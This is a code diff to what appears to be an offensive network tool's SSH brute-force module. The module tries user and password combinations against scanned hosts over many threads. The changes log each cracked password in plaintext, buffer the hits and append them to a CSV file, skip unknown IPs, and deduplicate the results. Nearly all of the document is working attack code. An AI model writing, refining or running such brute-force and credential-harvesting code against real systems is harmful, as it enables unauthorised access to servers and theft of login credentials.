@@ -47,6 +47,13 @@ class SSHBruteforce:
         logger.info(f"Executing SSHBruteforce on {ip}:{port}...")
         self.shared_data.ragnarorch_status = "SSHBruteforce"
         success, results = self.bruteforce_ssh(ip, port)
+        if success and results:
+            for mac_address, ip_addr, hostname, user, password, used_port in results:
+                logger.success(
+                    f"SSH credentials confirmed | MAC: {mac_address} | IP: {ip_addr} | Host: {hostname} | User: {user} | Password: {password} | Port: {used_port}"
+                )
+        else:
+            logger.info(f"SSHBruteforce completed for {ip}:{port} with no valid credentials discovered")
         return 'success' if success else 'failed'
 
 class SSHConnector:
@@ -78,7 +85,8 @@ class SSHConnector:
             logger.info(f"File {self.sshfile} does not exist. Creating...")
             with open(self.sshfile, "w") as f:
                 f.write("MAC Address,IP Address,Hostname,User,Password,Port\n")
-        self.results = []  # List to store results temporarily
+        self.results = []  # Successful credentials for the current bruteforce run
+        self._pending_results = []  # Entries waiting to be flushed to disk
         self.queue = Queue()
         self.console = Console()
 
@@ -121,10 +129,13 @@ class SSHConnector:
             adresse_ip, user, password, mac_address, hostname, port = self.queue.get()
             if self.ssh_connect(adresse_ip, user, password):
                 with self.lock:
-                    self.results.append([mac_address, adresse_ip, hostname, user, password, port])
-                    logger.success(f"Found credentials  IP: {adresse_ip} | User: {user} | Password: {password}")
+                    entry = [mac_address, adresse_ip, hostname, user, password, port]
+                    self.results.append(entry)
+                    self._pending_results.append(entry)
+                    logger.success(
+                        f"Found SSH credentials -> IP: {adresse_ip} | User: {user} | Password: {password}"
+                    )
                     self.save_results()
-                    self.removeduplicates()
                     success_flag[0] = True
             self.queue.task_done()
             progress.update(task_id, advance=1)
@@ -133,8 +144,17 @@ class SSHConnector:
     def run_bruteforce(self, adresse_ip, port):
         self.load_scan_file()  # Reload the scan file to get the latest IPs and ports
 
-        mac_address = self.scan.loc[self.scan['IPs'] == adresse_ip, 'MAC Address'].values[0]
-        hostname = self.scan.loc[self.scan['IPs'] == adresse_ip, 'Hostnames'].values[0]
+        # Reset trackers for a fresh run on this host
+        self.results = []
+        self._pending_results = []
+
+        ip_rows = self.scan[self.scan['IPs'] == adresse_ip]
+        if ip_rows.empty:
+            logger.warning(f"IP {adresse_ip} not present in scan cache; skipping SSH bruteforce")
+            return False, []
+
+        mac_address = ip_rows['MAC Address'].values[0]
+        hostname = ip_rows['Hostnames'].values[0]
 
         total_tasks = len(self.users) * len(self.passwords)
         
@@ -169,21 +189,34 @@ class SSHConnector:
             for t in threads:
                 t.join()
 
-        return success_flag[0], self.results  # Return True and the list of successes if at least one attempt was successful
+        # Final flush/dedup after all threads complete to guarantee persistence
+        with self.lock:
+            self.save_results()
+            self.removeduplicates()
+
+        return success_flag[0], list(self.results)
 
 
     def save_results(self):
-        """
-        Save the results of successful connection attempts to a CSV file.
-        """
-        df = pd.DataFrame(self.results, columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port'])
-        df.to_csv(self.sshfile, index=False, mode='a', header=not os.path.exists(self.sshfile))
-        self.results = []  # Reset temporary results after saving
+        """Persist pending successful connection attempts to disk."""
+        if not self._pending_results:
+            return
+
+        df = pd.DataFrame(
+            self._pending_results,
+            columns=['MAC Address', 'IP Address', 'Hostname', 'User', 'Password', 'Port']
+        )
+        file_exists = os.path.exists(self.sshfile)
+        df.to_csv(self.sshfile, index=False, mode='a', header=not file_exists)
+        self._pending_results.clear()
 
     def removeduplicates(self):
         """
         Remove duplicate entries from the results CSV file.
         """
+        if not os.path.exists(self.sshfile):
+            return
+
         df = pd.read_csv(self.sshfile)
         df.drop_duplicates(inplace=True)
         df.to_csv(self.sshfile, index=False)
